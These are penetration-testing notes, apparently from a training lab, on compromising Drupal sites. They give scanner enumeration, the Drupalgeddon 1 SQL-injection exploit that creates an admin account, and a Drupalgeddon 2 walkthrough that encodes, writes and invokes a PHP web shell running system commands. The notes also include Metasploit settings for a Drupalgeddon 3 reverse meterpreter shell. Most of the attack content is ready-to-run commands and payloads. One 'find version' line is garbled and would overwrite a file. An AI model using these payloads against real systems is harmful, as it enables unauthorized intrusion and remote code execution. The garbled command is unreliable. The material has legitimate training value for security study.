- `droopescan scan drupal -u http://example.org/ -t 32`
- `find version > /CHANGELOG.txt`

### Enumeration
```bash
# Enumeration
sudo pip3 install droopescan
droopescan scan drupal -u http://drupal.inlanefreight.local
```
## After login admin panel 
- RCE via PHP Filter Module (Drupal 7)
-  Installing PHP Filter in Drupal 8+

`you can get the shell using above methords search for any article for it
`
##  Drupalgeddon 1 – CVE-2014-3704 
https://www.exploit-db.com/exploits/34992
- Affects: Drupal 7.0 – 7.31
- Type: Pre-auth SQL Injection
- Goal: If successfull it will create an admin user
```bash
python2 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

## Drupalgeddon 2 – CVE-2018-7600
https://www.exploit-db.com/exploits/44448
- Affects: Drupal < 7.58 and 8.5.1
- Type: Unauthenticated RCE via user registration
#### Steps:
- Run the PoC script:
```bash
python3 drupalgeddon2.py
```
- Confirm with:
```bash
curl http://drupal-dev.inlanefreight.local/hello.txt
```
- Upload malicious PHP file:
```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```
- Decode & save:
```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```
- Run the modified PoC to upload shell

```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## Drupalgeddon 3 – CVE-2018-7602
- Affects: Drupal 7.x and 8.x
- Type: Authenticated RCE
- Requires: Valid session cookie & node delete permission
#### Steps:
- Log in and get session cookie (SESSxxx=xxx).
Use Metasploit:
```bash
use exploit/multi/http/drupal_drupageddon3
set RHOSTS 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set DRUPAL_SESSION SESSxxx=xyz
set DRUPAL_NODE 1
set LHOST 10.10.14.15
exploit
```
Shell success:
```bash
meterpreter > getuid
www-data
```
